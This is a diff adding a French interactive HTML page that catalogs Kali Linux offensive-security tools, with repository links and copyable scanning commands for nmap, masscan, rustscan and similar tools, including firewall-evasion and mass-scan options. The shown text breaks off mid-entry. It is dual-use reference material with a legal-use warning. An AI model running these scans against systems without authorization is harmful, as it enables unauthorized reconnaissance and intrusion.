@@ -1,0 +1,1384 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>La Bibliothèque du Hacker</title>
+<style>
+  :root{
+    --bg:#070b11; --bg2:#0b1119; --card:#111926; --card2:#0c1320; --code:#05090f;
+    --line:#1b2636; --line2:#28384f;
+    --neon:#00ff9c; --neon2:#00e5ff; --amber:#ffb300; --mag:#ff2d78; --vio:#9d7bff;
+    --txt:#cdd8e6; --txt2:#7d8da3; --txt3:#51607a;
+    --mono:'JetBrains Mono','Fira Code',ui-monospace,SFMono-Regular,Menlo,monospace;
+    --sans:'Segoe UI',system-ui,-apple-system,sans-serif;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  body{background:var(--bg);color:var(--txt);font-family:var(--sans);line-height:1.5;
+    background-image:radial-gradient(900px circle at 10% -5%,rgba(0,229,255,.05),transparent 45%),radial-gradient(800px circle at 95% 0%,rgba(0,255,156,.045),transparent 45%);
+    min-height:100vh}
+  a{color:var(--neon2)}
+  ::selection{background:rgba(0,255,156,.25)}
+
+  .layout{display:grid;grid-template-columns:238px 1fr;max-width:1500px;margin:0 auto;gap:0}
+  /* sidebar */
+  .side{position:sticky;top:0;height:100vh;overflow-y:auto;padding:26px 14px 40px;border-right:1px solid var(--line);background:rgba(7,11,17,.6)}
+  .side::-webkit-scrollbar{width:6px}.side::-webkit-scrollbar-thumb{background:var(--line2);border-radius:3px}
+  .brand{font-family:var(--mono);font-weight:700;font-size:16px;letter-spacing:-.5px;margin:4px 8px 4px;
+    background:linear-gradient(90deg,var(--neon),var(--neon2));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+  .brandsub{font-family:var(--mono);font-size:10px;color:var(--txt3);letter-spacing:2px;text-transform:uppercase;margin:0 8px 18px}
+  .navitem{display:flex;align-items:center;gap:10px;font-size:13px;color:var(--txt2);padding:8px 10px;border-radius:8px;cursor:pointer;transition:.13s;user-select:none;border:1px solid transparent}
+  .navitem:hover{background:var(--card2);color:var(--txt)}
+  .navitem.on{background:linear-gradient(90deg,rgba(0,255,156,.14),rgba(0,229,255,.08));color:var(--neon);border-color:rgba(0,255,156,.25)}
+  .navitem .ic{font-size:15px;width:20px;text-align:center}
+  .navitem .nm{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .navitem .ct{font-family:var(--mono);font-size:10.5px;color:var(--txt3)}
+  .navitem.on .ct{color:var(--neon)}
+  .navsep{height:1px;background:var(--line);margin:12px 8px}
+
+  .main{min-width:0;padding:0 28px 90px}
+  header{padding:38px 0 22px}
+  .glyph{font-family:var(--mono);color:var(--neon);font-size:12px;letter-spacing:3px;text-transform:uppercase;opacity:.75}
+  h1{font-family:var(--mono);font-size:clamp(26px,4.4vw,42px);font-weight:700;letter-spacing:-1px;margin:7px 0 10px;
+    background:linear-gradient(90deg,var(--neon),var(--neon2) 60%,var(--vio));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+  .sub{color:var(--txt2);max-width:720px;font-size:15px}
+  .sub b{color:var(--txt)}
+  .metrics{display:flex;gap:10px;flex-wrap:wrap;margin-top:20px}
+  .metric{background:var(--card2);border:1px solid var(--line);border-radius:10px;padding:11px 16px;min-width:92px}
+  .metric .v{font-family:var(--mono);font-size:22px;font-weight:700;color:var(--neon)}
+  .metric .v.c2{color:var(--neon2)}.metric .v.c3{color:var(--amber)}.metric .v.c4{color:var(--vio)}
+  .metric .l{font-size:11px;color:var(--txt2);margin-top:2px;text-transform:uppercase;letter-spacing:.5px}
+
+  .toolbar{position:sticky;top:0;z-index:30;background:rgba(7,11,17,.94);backdrop-filter:blur(10px);
+    padding:14px 0;border-bottom:1px solid var(--line);margin-bottom:22px;display:flex;gap:12px;align-items:center;flex-wrap:wrap}
+  .search{flex:1;min-width:220px;display:flex;align-items:center;gap:10px;background:var(--card);
+    border:1px solid var(--line2);border-radius:11px;padding:11px 14px;transition:border-color .15s}
+  .search:focus-within{border-color:var(--neon)}
+  .search .pr{color:var(--neon);font-family:var(--mono);font-size:15px}
+  .search input{flex:1;background:none;border:none;outline:none;color:var(--txt);font-size:15px;font-family:var(--mono);min-width:0}
+  .search input::placeholder{color:var(--txt3)}
+  .search .kbd{font-family:var(--mono);font-size:10px;color:var(--txt3);border:1px solid var(--line2);border-radius:5px;padding:2px 6px}
+  .favbtn{font-family:var(--mono);font-size:12.5px;color:var(--txt2);background:var(--card2);border:1px solid var(--line);
+    border-radius:30px;padding:9px 15px;cursor:pointer;transition:.15s;white-space:nowrap;user-select:none;display:flex;align-items:center;gap:7px}
+  .favbtn:hover{border-color:var(--line2);color:var(--txt)}
+  .favbtn.on{background:rgba(255,179,0,.12);border-color:var(--amber);color:var(--amber)}
+
+  .legend{display:flex;gap:16px;flex-wrap:wrap;font-family:var(--mono);font-size:11.5px;color:var(--txt2);margin:0 0 26px;align-items:center}
+  .legend span{display:inline-flex;align-items:center;gap:7px}
+  .dot{width:9px;height:9px;border-radius:50%;display:inline-block}
+  .dot.std{background:var(--neon);box-shadow:0 0 8px var(--neon)}
+  .dot.add{background:var(--amber);box-shadow:0 0 8px var(--amber)}
+  .hintx{color:var(--txt3)}
+
+  .warn{background:rgba(255,45,120,.07);border:1px solid rgba(255,45,120,.25);border-radius:11px;
+    padding:13px 16px;margin:0 0 28px;color:var(--txt);font-size:13px}
+  .warn b{color:var(--mag);font-family:var(--mono)}
+
+  .section{margin-bottom:38px;scroll-margin-top:84px}
+  .sechead{display:flex;align-items:baseline;gap:13px;margin-bottom:15px;padding-bottom:10px;border-bottom:1px dashed var(--line2)}
+  .sechead h2{font-family:var(--mono);font-size:18px;color:var(--neon2);font-weight:600}
+  .sechead .cnt{font-family:var(--mono);font-size:11.5px;color:var(--txt3)}
+  .sechead .ic{font-size:17px}
+
+  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(316px,1fr));gap:13px}
+  .card{background:linear-gradient(162deg,var(--card),var(--card2));border:1px solid var(--line);
+    border-radius:13px;padding:15px 15px 13px;transition:.16s;position:relative;overflow:hidden;cursor:pointer}
+  .card::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--neon);opacity:.5}
+  .card.add::before{background:var(--amber)}
+  .card:hover{border-color:var(--neon);transform:translateY(-2px);box-shadow:0 10px 32px rgba(0,0,0,.5)}
+  .card .top{display:flex;align-items:center;gap:9px;margin-bottom:8px}
+  .card .name{font-family:var(--mono);font-size:15.5px;font-weight:600;color:#eef4fb;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .star{font-size:15px;color:var(--txt3);cursor:pointer;transition:.13s;line-height:1;padding:2px}
+  .star:hover{color:var(--amber);transform:scale(1.15)}
+  .star.on{color:var(--amber)}
+  .badge{font-family:var(--mono);font-size:9.5px;letter-spacing:.5px;padding:3px 8px;border-radius:20px;white-space:nowrap;text-transform:uppercase}
+  .badge.std{color:var(--neon);background:rgba(0,255,156,.1);border:1px solid rgba(0,255,156,.3)}
+  .badge.add{color:var(--amber);background:rgba(255,179,0,.1);border:1px solid rgba(255,179,0,.3)}
+  .card .role{color:var(--txt2);font-size:13px;margin-bottom:10px;min-height:36px;line-height:1.45}
+  .inst{font-family:var(--mono);font-size:11.5px;background:var(--code);border:1px solid var(--line);
+    border-radius:7px;padding:8px 10px;overflow-x:auto;white-space:nowrap;display:flex;align-items:center;gap:7px}
+  .inst .lbl{color:var(--txt3)}.inst .v{color:var(--amber)}
+  .inst::-webkit-scrollbar{height:4px}.inst::-webkit-scrollbar-thumb{background:var(--line2);border-radius:3px}
+  .cardfoot{margin-top:9px;display:flex;align-items:center;justify-content:space-between;gap:8px}
+  .card .more{font-family:var(--mono);font-size:11px;color:var(--neon2);opacity:.85}
+  .card:hover .more{opacity:1}
+  .card .src{font-family:var(--mono);font-size:10.5px;color:var(--txt3);text-decoration:none;white-space:nowrap;max-width:50%;overflow:hidden;text-overflow:ellipsis;transition:.15s}
+  .card .src:hover{color:var(--neon)}
+
+  .empty{text-align:center;padding:70px 20px;color:var(--txt3);font-family:var(--mono)}
+  footer{margin-top:46px;padding-top:22px;border-top:1px solid var(--line);color:var(--txt3);font-size:12.5px;font-family:var(--mono)}
+  footer b{color:var(--mag)}
+
+  /* modal */
+  .ov{position:fixed;inset:0;background:rgba(3,6,10,.8);backdrop-filter:blur(6px);z-index:100;
+    display:none;align-items:flex-start;justify-content:center;padding:36px 16px;overflow-y:auto}
+  .ov.on{display:flex}
+  .modal{background:linear-gradient(168deg,#101a28,#0a111b);border:1px solid var(--line2);border-radius:16px;
+    max-width:740px;width:100%;overflow:hidden;box-shadow:0 24px 80px rgba(0,0,0,.65);animation:pop .17s ease}
+  @keyframes pop{from{transform:translateY(14px);opacity:0}to{transform:none;opacity:1}}
+  .mhead{padding:22px 24px 20px;border-bottom:1px solid var(--line);position:relative;
+    background:linear-gradient(90deg,rgba(0,255,156,.06),rgba(0,229,255,.03))}
+  .mcat{font-family:var(--mono);font-size:11px;color:var(--neon2);letter-spacing:1px;text-transform:uppercase}
+  .mhead h3{font-family:var(--mono);font-size:23px;color:#eef4fb;margin:4px 0 8px;display:flex;align-items:center;gap:10px}
+  .mhead h3 .mstar{font-size:19px;cursor:pointer;color:var(--txt3)}.mhead h3 .mstar.on{color:var(--amber)}
+  .mrole{color:var(--txt2);font-size:14px;max-width:580px}
+  .mbadge{position:absolute;top:22px;right:62px}
+  .mclose{position:absolute;top:18px;right:18px;width:34px;height:34px;border-radius:9px;border:1px solid var(--line2);
+    background:var(--card2);color:var(--txt2);font-size:17px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:.15s;font-family:var(--mono)}
+  .mclose:hover{border-color:var(--mag);color:var(--mag)}
+  .msrc{display:inline-flex;align-items:center;gap:6px;margin-top:13px;font-family:var(--mono);font-size:12.5px;
+    color:var(--neon2);text-decoration:none;background:rgba(0,229,255,.08);border:1px solid rgba(0,229,255,.25);
+    border-radius:7px;padding:7px 12px;transition:.15s}
+  .msrc:hover{border-color:var(--neon2);background:rgba(0,229,255,.14)}
+  .mbody{padding:20px 24px 26px;max-height:60vh;overflow-y:auto}
+  .mbody::-webkit-scrollbar{width:7px}.mbody::-webkit-scrollbar-thumb{background:var(--line2);border-radius:4px}
+  .minst{font-family:var(--mono);font-size:12.5px;background:var(--code);border:1px solid rgba(255,179,0,.3);
+    border-radius:9px;padding:11px 13px;margin-bottom:20px;display:flex;align-items:center;gap:9px;cursor:pointer;transition:.15s}
+  .minst:hover{border-color:var(--amber)}
+  .minst .lbl{color:var(--txt3);text-transform:uppercase;font-size:10px;letter-spacing:1px}
+  .minst .v{color:var(--amber);flex:1}
+  .mlabrow{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:12px}
+  .mlab{font-family:var(--mono);font-size:11px;color:var(--txt3);text-transform:uppercase;letter-spacing:1.5px}
+  .copyall{font-family:var(--mono);font-size:11px;color:var(--neon);background:rgba(0,255,156,.08);border:1px solid rgba(0,255,156,.3);
+    border-radius:7px;padding:6px 11px;cursor:pointer;transition:.15s;white-space:nowrap}
+  .copyall:hover{background:rgba(0,255,156,.16)}
+  .cmdrow{margin-bottom:13px}
+  .cmdrow .d{color:var(--txt2);font-size:13px;margin-bottom:5px}
+  .cmdline{font-family:var(--mono);font-size:12.5px;background:var(--code);border:1px solid var(--line);border-radius:8px;
+    padding:10px 12px;color:var(--neon);overflow-x:auto;white-space:nowrap;cursor:pointer;transition:.15s;position:relative}
+  .cmdline:hover{border-color:var(--neon)}
+  .cmdline::-webkit-scrollbar{height:4px}.cmdline::-webkit-scrollbar-thumb{background:var(--line2);border-radius:3px}
+  .cmdline .cp{position:absolute;right:8px;top:7px;font-size:10px;color:var(--txt3);background:var(--card2);padding:2px 6px;border-radius:5px;opacity:0;transition:.15s}
+  .cmdline:hover .cp{opacity:1}
+  .toast{position:fixed;bottom:26px;left:50%;transform:translateX(-50%) translateY(20px);background:var(--neon);
+    color:#042;font-family:var(--mono);font-size:13px;font-weight:600;padding:10px 20px;border-radius:30px;
+    opacity:0;transition:.2s;z-index:200;pointer-events:none}
+  .toast.on{opacity:1;transform:translateX(-50%) translateY(0)}
+
+  .mcats{display:none}
+  @media(max-width:900px){
+    .layout{grid-template-columns:1fr}
+    .side{display:none}
+    .main{padding:0 14px 80px}
+    .mcats{display:flex;gap:8px;overflow-x:auto;padding:2px 0 14px;-webkit-overflow-scrolling:touch;scrollbar-width:none}
+    .mcats::-webkit-scrollbar{height:0}
+    .mchip{flex:0 0 auto;font-family:var(--mono);font-size:12px;color:var(--txt2);background:var(--card2);border:1px solid var(--line);border-radius:30px;padding:8px 13px;white-space:nowrap;cursor:pointer;user-select:none}
+    .mchip.on{background:linear-gradient(90deg,rgba(0,255,156,.16),rgba(0,229,255,.1));border-color:var(--neon);color:var(--neon)}
+    .mchip .ct{opacity:.55;margin-left:5px}
+  }
+</style>
+</head>
+<body>
+<div class="layout">
+  <nav class="side" id="side">
+    <div class="brand">⌁ Bibliothèque</div>
+    <div class="brandsub">du hacker</div>
+    <div id="nav"></div>
+  </nav>
+
+  <div class="main">
+    <header>
+      <div class="glyph">// kali linux arsenal — référence complète</div>
+      <h1>La Bibliothèque du Hacker</h1>
+      <p class="sub">La référence interactive de l'arsenal <b>Kali Linux</b>, rangée par phase d'intrusion. Clique une fiche pour <b>toutes ses commandes</b>, copie-les d'un clic, mets en favori, et saute vers le dépôt officiel de chaque outil.</p>
+      <div class="metrics" id="metrics"></div>
+    </header>
+
+    <div class="toolbar">
+      <div class="search"><span class="pr">❯</span><input id="q" type="text" placeholder="rechercher un outil, un rôle, une commande..." autocomplete="off"><span class="kbd">/</span></div>
+      <div class="favbtn" id="favbtn">★ Favoris <span id="favn" style="opacity:.6"></span></div>
+    </div>
+
+    <div class="mcats" id="mcats"></div>
+
+    <div class="legend">
+      <span><i class="dot std"></i> Inclus dans Kali par défaut</span>
+      <span><i class="dot add"></i> À installer</span>
+      <span class="hintx">· clic = détails · clic commande = copier · ★ = favori · <b>/</b> = recherche</span>
+    </div>
+
+    <div class="warn"><b>⚠ Usage légal uniquement.</b> Ces outils s'emploient sur ta propre infrastructure ou avec une autorisation écrite. Les lancer contre un tiers sans mandat est un délit (France : art. 323-1 et s. du code pénal). Entraîne-toi sur tes machines ou des labs (HackTheBox, TryHackMe, Metasploitable, DVWA).</div>
+
+    <div id="out"></div>
+
+    <footer>Généré pour <b>ta Kali</b> · référence basée sur la panoplie standard + outils tiers courants. Statuts « défaut / à installer » = métapaquet kali-linux-default. La vraie liste exhaustive des options de chaque outil reste <b>man &lt;outil&gt;</b> / <b>&lt;outil&gt; --help</b>.</footer>
+  </div>
+</div>
+
+<div class="ov" id="ov"><div class="modal" id="modal"></div></div>
+<div class="toast" id="toast">copié ✓</div>
+
+<script>
+const CATS=[
+ {id:"recon",name:"Reconnaissance & OSINT",ic:"🛰️"},
+ {id:"scan",name:"Scan & cartographie réseau",ic:"📡"},
+ {id:"web",name:"Énumération web",ic:"🌐"},
+ {id:"webvuln",name:"Failles & exploitation web",ic:"💉"},
+ {id:"proxy",name:"Proxies d'interception",ic:"🕸️"},
+ {id:"exploit",name:"Exploitation & C2",ic:"🎯"},
+ {id:"pass",name:"Mots de passe & hash",ic:"🔑"},
+ {id:"wifi",name:"WiFi & sans-fil",ic:"📶"},
+ {id:"mitm",name:"MITM & sniffing",ic:"👂"},
+ {id:"ad",name:"Windows / Active Directory",ic:"🪟"},
+ {id:"cloud",name:"Cloud & conteneurs",ic:"☁️"},
+ {id:"forensic",name:"Forensics & stéganographie",ic:"🔬"},
+ {id:"reverse",name:"Reverse & exploitation binaire",ic:"⚙️"},
+ {id:"mobile",name:"Mobile & applications",ic:"📱"},
+ {id:"social",name:"Social engineering & phishing",ic:"🎭"},
+ {id:"anon",name:"Anonymat, pivot & post-exploit",ic:"🥷"},
+];
+const BIN={"Burp Suite":"burpsuite","OWASP ZAP":"zaproxy","Metasploit":"msfconsole","SET":"setoolkit","BeEF":"beef-xss","evilginx2":"evilginx","winpeas":"winpeass.exe","linpeas":"linpeas.sh","impacket":"impacket-secretsdump","theHarvester":"theHarvester","ROPgadget":"ROPgadget","mimikatz":"mimikatz.exe","rubeus":"Rubeus.exe","LaZagne":"lazagne","MobSF":"mobsf","Sliver":"sliver-server"};
+function binOf(t){return BIN[t.n]||t.n.replace(/\s+/g,'').toLowerCase();}
+const URLS={
+"nmap":"https://nmap.org","masscan":"https://github.com/robertdavidgraham/masscan","rustscan":"https://github.com/RustScan/RustScan","arp-scan":"https://github.com/royhills/arp-scan","netdiscover":"https://github.com/netdiscover-scanner/netdiscover","nbtscan":"https://github.com/resurrecting-open-source-projects/nbtscan","fping":"https://fping.org","hping3":"https://github.com/antirez/hping","naabu":"https://github.com/projectdiscovery/naabu",
+"amass":"https://github.com/owasp-amass/amass","subfinder":"https://github.com/projectdiscovery/subfinder","assetfinder":"https://github.com/tomnomnom/assetfinder","theHarvester":"https://github.com/laramies/theHarvester","dnsenum":"https://github.com/fwaeytens/dnsenum","dnsrecon":"https://github.com/darkoperator/dnsrecon","dnsx":"https://github.com/projectdiscovery/dnsx","fierce":"https://github.com/mschwager/fierce","recon-ng":"https://github.com/lanmaster53/recon-ng","spiderfoot":"https://github.com/smicallef/spiderfoot","maltego":"https://www.maltego.com","sublist3r":"https://github.com/aboul3la/Sublist3r","shodan":"https://cli.shodan.io","sherlock":"https://github.com/sherlock-project/sherlock","holehe":"https://github.com/megadose/holehe",
+"gobuster":"https://github.com/OJ/gobuster","feroxbuster":"https://github.com/epi052/feroxbuster","ffuf":"https://github.com/ffuf/ffuf","dirb":"https://dirb.sourceforge.net","dirsearch":"https://github.com/maurosoria/dirsearch","wfuzz":"https://github.com/xmendez/wfuzz","whatweb":"https://github.com/urbanadventurer/WhatWeb","wafw00f":"https://github.com/EnableSecurity/wafw00f","nuclei":"https://github.com/projectdiscovery/nuclei","httpx":"https://github.com/projectdiscovery/httpx","katana":"https://github.com/projectdiscovery/katana","hakrawler":"https://github.com/hakluke/hakrawler","gospider":"https://github.com/jaeles-project/gospider","gau":"https://github.com/lc/gau","waybackurls":"https://github.com/tomnomnom/waybackurls","arjun":"https://github.com/s0md3v/Arjun","paramspider":"https://github.com/devanshbatham/ParamSpider","x8":"https://github.com/Sh1Yo/x8","gf":"https://github.com/tomnomnom/gf","httprobe":"https://github.com/tomnomnom/httprobe",
+"nikto":"https://github.com/sullo/nikto","sqlmap":"https://github.com/sqlmapproject/sqlmap","dalfox":"https://github.com/hahwul/dalfox","xsser":"https://github.com/epsylon/xsser","commix":"https://github.com/commixproject/commix","wpscan":"https://github.com/wpscanteam/wpscan","joomscan":"https://github.com/OWASP/joomscan","droopescan":"https://github.com/SamJoan/droopescan","nosqlmap":"https://github.com/codingo/NoSQLMap","jwt_tool":"https://github.com/ticarpi/jwt_tool",
+"Burp Suite":"https://portswigger.net/burp","OWASP ZAP":"https://www.zaproxy.org","mitmproxy":"https://github.com/mitmproxy/mitmproxy",
+"Metasploit":"https://github.com/rapid7/metasploit-framework","msfvenom":"https://github.com/rapid7/metasploit-framework","searchsploit":"https://gitlab.com/exploit-database/exploitdb","BeEF":"https://github.com/beefproject/beef","Armitage":"https://github.com/rsmudge/armitage","Sliver":"https://github.com/BishopFox/sliver","Villain":"https://github.com/t3l3machus/Villain",
+"SET":"https://github.com/trustedsec/social-engineer-toolkit","Gophish":"https://github.com/gophish/gophish","evilginx2":"https://github.com/kgretzky/evilginx2","zphisher":"https://github.com/htr-tech/zphisher",
+"hydra":"https://github.com/vanhauser-thc/thc-hydra","medusa":"https://github.com/jmk-foofus/medusa","ncrack":"https://github.com/nmap/ncrack","patator":"https://github.com/lanjelot/patator","john":"https://github.com/openwall/john","hashcat":"https://github.com/hashcat/hashcat","hashid":"https://github.com/psypanda/hashID","name-that-hash":"https://github.com/HashPals/Name-That-Hash","crunch":"https://sourceforge.net/projects/crunch-wordlist/","cewl":"https://github.com/digininja/CeWL","cupp":"https://github.com/Mebus/cupp","hashpump":"https://github.com/bwall/HashPump","fcrackzip":"https://github.com/hyc/fcrackzip","pdfcrack":"https://sourceforge.net/projects/pdfcrack/",
+"aircrack-ng":"https://github.com/aircrack-ng/aircrack-ng","airmon-ng":"https://github.com/aircrack-ng/aircrack-ng","airodump-ng":"https://github.com/aircrack-ng/aircrack-ng","wifite":"https://github.com/derv82/wifite2","reaver":"https://github.com/t6x/reaver-wps-fork-t6x","bully":"https://github.com/aanarchyy/bully","kismet":"https://github.com/kismetwireless/kismet","mdk4":"https://github.com/aircrack-ng/mdk4","hcxdumptool":"https://github.com/ZerBea/hcxdumptool","fern-wifi-cracker":"https://github.com/savio-code/fern-wifi-cracker","eaphammer":"https://github.com/s0lst1c3/eaphammer","airgeddon":"https://github.com/v1s1t0r1sh3r3/airgeddon",
+"wireshark":"https://www.wireshark.org","tshark":"https://www.wireshark.org","tcpdump":"https://github.com/the-tcpdump-group/tcpdump","bettercap":"https://github.com/bettercap/bettercap","ettercap":"https://github.com/Ettercap/ettercap","responder":"https://github.com/lgandx/Responder","dsniff":"https://www.monkey.org/~dugsong/dsniff/","scapy":"https://github.com/secdev/scapy","mitm6":"https://github.com/dirkjanm/mitm6",
+"enum4linux":"https://github.com/CiscoCXSecurity/enum4linux","enum4linux-ng":"https://github.com/cddmp/enum4linux-ng","smbmap":"https://github.com/ShawnDEvans/smbmap","smbclient":"https://www.samba.org","netexec":"https://github.com/Pennyw0rth/NetExec","crackmapexec":"https://github.com/byt3bl33d3r/CrackMapExec","rpcclient":"https://www.samba.org","impacket":"https://github.com/fortra/impacket","evil-winrm":"https://github.com/Hackplayers/evil-winrm","bloodhound":"https://github.com/SpecterOps/BloodHound","kerbrute":"https://github.com/ropnop/kerbrute","ldapsearch":"https://www.openldap.org","certipy":"https://github.com/ly4k/Certipy","mimikatz":"https://github.com/gentilkiwi/mimikatz","rubeus":"https://github.com/GhostPack/Rubeus","ldapdomaindump":"https://github.com/dirkjanm/ldapdomaindump","sprayhound":"https://github.com/Hackndo/sprayhound","pywerview":"https://github.com/the-useless-one/pywerview","coercer":"https://github.com/p0dalirius/Coercer",
+"prowler":"https://github.com/prowler-cloud/prowler","scoutsuite":"https://github.com/nccgroup/ScoutSuite","pacu":"https://github.com/RhinoSecurityLabs/pacu","trivy":"https://github.com/aquasecurity/trivy","kube-hunter":"https://github.com/aquasecurity/kube-hunter","kube-bench":"https://github.com/aquasecurity/kube-bench","cloudfox":"https://github.com/BishopFox/cloudfox",
+"binwalk":"https://github.com/ReFirmLabs/binwalk","foremost":"https://foremost.sourceforge.net","scalpel":"https://github.com/sleuthkit/scalpel","volatility3":"https://github.com/volatilityfoundation/volatility3","autopsy":"https://github.com/sleuthkit/autopsy","sleuthkit":"https://github.com/sleuthkit/sleuthkit","exiftool":"https://github.com/exiftool/exiftool","bulk-extractor":"https://github.com/simsong/bulk_extractor","steghide":"https://steghide.sourceforge.net","stegsnow":"https://www.kali.org/tools/stegsnow/","zsteg":"https://github.com/zed-0xff/zsteg","testdisk":"https://www.cgsecurity.org/wiki/TestDisk","photorec":"https://www.cgsecurity.org/wiki/PhotoRec","LaZagne":"https://github.com/AlessandroZ/LaZagne",
+"ghidra":"https://github.com/NationalSecurityAgency/ghidra","radare2":"https://github.com/radareorg/radare2","cutter":"https://github.com/rizinorg/cutter","gdb":"https://www.sourceware.org/gdb/","objdump":"https://www.gnu.org/software/binutils/","checksec":"https://github.com/slimm609/checksec.sh","ropper":"https://github.com/sashs/Ropper","ROPgadget":"https://github.com/JonathanSalwan/ROPgadget","pwntools":"https://github.com/Gallopsled/pwntools","strings":"https://www.gnu.org/software/binutils/","ltrace":"https://ltrace.org","strace":"https://github.com/strace/strace","angr":"https://github.com/angr/angr","upx":"https://github.com/upx/upx","pwninit":"https://github.com/io12/pwninit","one_gadget":"https://github.com/david942j/one_gadget",
+"apktool":"https://github.com/iBotPeaches/Apktool","jadx":"https://github.com/skylot/jadx","dex2jar":"https://github.com/pxb1988/dex2jar","frida":"https://github.com/frida/frida","objection":"https://github.com/sensepost/objection","MobSF":"https://github.com/MobSF/Mobile-Security-Framework-MobSF","drozer":"https://github.com/WithSecureLabs/drozer",
+"proxychains4":"https://github.com/rofl0r/proxychains-ng","tor":"https://www.torproject.org","chisel":"https://github.com/jpillora/chisel","ligolo-ng":"https://github.com/nicocha30/ligolo-ng","linpeas":"https://github.com/peass-ng/PEASS-ng","winpeas":"https://github.com/peass-ng/PEASS-ng","socat":"http://www.dest-unreach.org/socat/","sshuttle":"https://github.com/sshuttle/sshuttle","pspy":"https://github.com/DominicBreuker/pspy","macchanger":"https://github.com/alobbs/macchanger"};
+function urlOf(t){return URLS[t.n]||("https://www.kali.org/tools/"+binOf(t)+"/");}
+function host(u){try{return u.replace(/^https?:\/\//,'').replace(/\/.*$/,'');}catch(e){return u;}}
+
+const T=[
+ {n:"nmap",c:"scan",std:1,inst:"sudo apt install nmap",r:"Le couteau suisse du scan : ports, services, versions, OS, scripts NSE.",cmds:[
+   {d:"Découverte d'hôtes (ping sweep)",c:"nmap -sn 192.168.1.0/24"},
+   {d:"Scan SYN furtif (root)",c:"sudo nmap -sS CIBLE"},
+   {d:"Versions + scripts par défaut",c:"nmap -sV -sC CIBLE"},
+   {d:"Tous les 65535 ports, rapide",c:"nmap -p- -T4 CIBLE"},
+   {d:"Ports précis",c:"nmap -p 22,80,443,445,3389 CIBLE"},
+   {d:"Le grand jeu (OS, versions, scripts, trace)",c:"nmap -A CIBLE"},
+   {d:"Détection d'OS",c:"sudo nmap -O CIBLE"},
+   {d:"Scan UDP des ports courants",c:"sudo nmap -sU --top-ports 50 CIBLE"},
+   {d:"Recherche de failles connues",c:"nmap --script vuln CIBLE"},
+   {d:"Scripts d'une catégorie (SMB)",c:"nmap --script 'smb-*' -p445 CIBLE"},
+   {d:"Énumération HTTP",c:"nmap --script http-enum -p80,443 CIBLE"},
+   {d:"Contourner un pare-feu (fragments + leurres)",c:"sudo nmap -f -D RND:5 CIBLE"},
+   {d:"Scan lent et discret",c:"nmap -T1 -sS CIBLE"},
+   {d:"Sauvegarder tous les formats",c:"nmap -A CIBLE -oA resultat"},
+   {d:"Depuis une liste de cibles",c:"nmap -iL cibles.txt"}]},
+ {n:"masscan",c:"scan",std:1,inst:"sudo apt install masscan",r:"Scanner de ports ultra-rapide (millions/s) pour dégrossir de larges plages.",cmds:[
+   {d:"Tous les ports d'un sous-réseau",c:"sudo masscan -p1-65535 192.168.1.0/24 --rate=10000"},
+   {d:"Ports web, débit élevé",c:"sudo masscan 10.0.0.0/8 -p80,443 --rate=100000"},
+   {d:"Exclure des IP",c:"sudo masscan 192.168.1.0/24 -p1-1000 --excludefile exclude.txt"},
+   {d:"Exporter en liste / XML",c:"sudo masscan -p1-1000 CIBLE -oL out.txt"},
+   {d:"Bannières (plus lent)",c:"sudo masscan CIBLE -p80 --banners"}]},
+ {n:"rustscan",c:"scan",std:0,inst:"sudo apt install rustscan",r:"Trouve les ports ouverts très vite puis passe le relais à nmap.",cmds:[
+   {d:"Scan puis nmap automatique",c:"rustscan -a CIBLE -- -sV -sC"},
+   {d:"Plage de ports",c:"rustscan -a CIBLE -r 1-1000"},
+   {d:"Plusieurs cibles",c:"rustscan -a CIBLE1,CIBLE2 -g"},
+   {d:"Ajuster le débit (batch)",c:"rustscan -a CIBLE -b 2000"}]},
+ {n:"naabu",c:"scan",std:0,inst:"sudo apt install naabu",r:"Scanner de ports rapide signé ProjectDiscovery, pensé pour le pipeline.",cmds:[
+   {d:"Scan rapide d'un hôte",c:"naabu -host CIBLE"},
+   {d:"Top 100 ports",c:"naabu -host CIBLE -top-ports 100"},
+   {d:"Chaîner avec httpx",c:"naabu -host CIBLE -silent | httpx"},
+   {d:"Depuis une liste",c:"naabu -list hosts.txt -o ports.txt"}]},
+ {n:"arp-scan",c:"scan",std:1,inst:"sudo apt install arp-scan",r:"Découverte des machines du réseau local via ARP (+ fabricant par MAC).",cmds:[
+   {d:"Scanner le réseau local",c:"sudo arp-scan --localnet"},
+   {d:"Plage précise",c:"sudo arp-scan 192.168.1.0/24"},
+   {d:"Interface précise",c:"sudo arp-scan -I eth0 --localnet"},
+   {d:"Sortie détaillée (fabricants)",c:"sudo arp-scan --localnet --plain"}]},
+ {n:"netdiscover",c:"scan",std:1,inst:"sudo apt install netdiscover",r:"Scanner ARP actif/passif pour lister les hôtes d'un sous-réseau.",cmds:[
+   {d:"Scan actif d'une plage",c:"sudo netdiscover -r 192.168.1.0/24"},
+   {d:"Mode passif (écoute)",c:"sudo netdiscover -p"},
+   {d:"Interface précise",c:"sudo netdiscover -i eth0"}]},
+ {n:"nbtscan",c:"scan",std:1,inst:"sudo apt install nbtscan",r:"Scanne les noms NetBIOS sur un réseau Windows.",cmds:[
+   {d:"Scanner un sous-réseau",c:"nbtscan 192.168.1.0/24"},
+   {d:"Affichage détaillé",c:"nbtscan -v 192.168.1.0/24"},
+   {d:"Récupérer les adresses MAC",c:"nbtscan -h 192.168.1.0/24"}]},
+ {n:"fping",c:"scan",std:1,inst:"sudo apt install fping",r:"Ping en masse pour repérer rapidement les hôtes vivants.",cmds:[
+   {d:"Hôtes vivants d'une plage",c:"fping -a -g 192.168.1.0/24 2>/dev/null"},
+   {d:"Depuis un fichier",c:"fping -a < cibles.txt"},
+   {d:"Statistiques détaillées",c:"fping -s -g 192.168.1.0/24"}]},
+ {n:"hping3",c:"scan",std:1,inst:"sudo apt install hping3",r:"Forge des paquets TCP/UDP/ICMP sur mesure (scan, test firewall).",cmds:[
